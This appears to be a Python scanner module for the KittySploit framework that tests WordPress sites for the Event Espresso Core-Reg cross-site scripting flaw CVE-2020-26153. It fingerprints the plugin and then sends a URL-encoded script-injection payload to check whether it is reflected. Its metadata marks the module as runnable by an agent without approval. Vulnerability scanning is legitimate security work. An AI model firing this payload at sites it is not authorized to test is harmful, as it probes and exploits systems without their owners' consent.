#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Event Espresso Core-Reg 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Event Espresso Core-Reg 4.10.7.p - Cross-Site Scripting Detection',
        'description': 'Event Espresso Core-Reg 4.10.7.p is vulnerable to cross-site scripting in wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php and allows remote attackers to inject arbitrary web script or HTML via the page parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2020', 'cve', 'xss', 'wordpress', 'wp-plugin', 'eventespresso', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://labs.nettitude.com/blog/cve-2020-26153-event-espresso-core-cross-site-scripting/',
            'https://github.com/eventespresso/event-espresso-core/compare/4.10.6.p...4.10.7.p',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-26153',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-26153',
    }

    def run(self):
        path = '/wp-content/plugins/event-espresso-core-reg/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Event Espresso', 'Tested up to:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php?page=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cb'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"/></script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Event Espresso Core-Reg 4.10.7.p - Cross-Site Scripting detected', path=path)
            return True
        return False

